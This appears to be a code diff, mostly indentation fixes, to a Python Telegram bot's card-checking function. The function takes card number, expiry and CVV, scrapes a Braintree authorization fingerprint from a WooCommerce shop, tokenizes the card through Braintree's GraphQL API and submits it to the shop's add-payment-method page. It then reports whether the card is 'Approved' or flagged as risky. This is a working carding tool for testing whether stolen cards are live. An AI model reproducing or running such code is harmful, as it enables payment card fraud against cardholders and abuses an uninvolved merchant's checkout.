@@ -128,22 +128,22 @@ def check_nonsk4(ccx):
     }
 
     response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-enc = response.json()['data']
-dec = base64.b64decode(enc).decode('utf-8')
-au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+    enc = response.json()['data']
+    dec = base64.b64decode(enc).decode('utf-8')
+    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
 
-headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'authorization': f'Bearer {au}',
-    'braintree-version': '2018-05-10',
-    'cache-control': 'no-cache',
-    'content-type': 'application/json',
-    'pragma': 'no-cache',
-    'user-agent': user,
-}
+    headers = {
+        'authority': 'payments.braintree-api.com',
+        'accept': '*/*',
+        'authorization': f'Bearer {au}',
+        'braintree-version': '2018-05-10',
+        'cache-control': 'no-cache',
+        'content-type': 'application/json',
+        'pragma': 'no-cache',
+        'user-agent': user,
+    }
 
-json_data = {
+    json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
@@ -166,56 +166,56 @@ json_data = {
     'operationName': 'TokenizeCreditCard',
 }
 
-response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
     try:
         tok = response.json()['data']['tokenizeCreditCard']['token']
     except KeyError:
         return f"Failed to tokenize card: {response.text}"
 
-headers = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'pragma': 'no-cache',
-    'user-agent': user,
-}
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded',
+        'pragma': 'no-cache',
+        'user-agent': user,
+    }
 
-data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+    data = {
+        'payment_method': 'braintree_credit_card',
+        'wc-braintree-credit-card-card-type': 'master-card',
+        'wc-braintree-credit-card-3d-secure-enabled': '',
+        'wc-braintree-credit-card-3d-secure-verified': '',
+        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+        'wc_braintree_credit_card_payment_nonce': tok,
+        'wc_braintree_device_data': '',
+        'wc-braintree-credit-card-tokenize-payment-method': 'true',
+        'woocommerce-add-payment-method-nonce': add_nonce,
+        '_wp_http_referer': '/my-account/add-payment-method/',
+        'woocommerce_add_payment_method': '1',
+    }
 
-response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+    response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
 
-text = response.text
+    text = response.text
 
-pattern = r'Status code (.*?)\s*</li>'
+    pattern = r'Status code (.*?)\s*</li>'
 
-match = re.search(pattern, text)
-if match:
-    result = match.group(1)
-    if 'risk_threshold' in text:
-        result = "RISK: Retry this BIN later."
-else:
-    if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-        result = "1000: Approved"
+    match = re.search(pattern, text)
+    if match:
+        result = match.group(1)
+        if 'risk_threshold' in text:
+            result = "RISK: Retry this BIN later."
     else:
-        result = "Error"
+        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+            result = "1000: Approved"
+        else:
+            result = "Error"
 
-if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
-    return 'Approved'
-else:
-    return result
+    if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
+        return 'Approved'
+    else:
+        return result
 
 def handle_nonsk4_command(bot, message):
     chat_id = message.chat.id
@@ -237,7 +237,7 @@ def handle_nonsk4_command(bot, message):
             )
 
     else:
-        bot.send_message(chat_id, "Please provide account details in the format: /nsk4 card_number|exp_month|exp_year|cvv")
+        bot.send_message(chat_id, "Please provide account details in the format: /nsk3 card_number|exp_month|exp_year|cvv")
 
 def get_footer_info(total_accounts, start_time, username):
     elapsed_time = time.time() - start_time
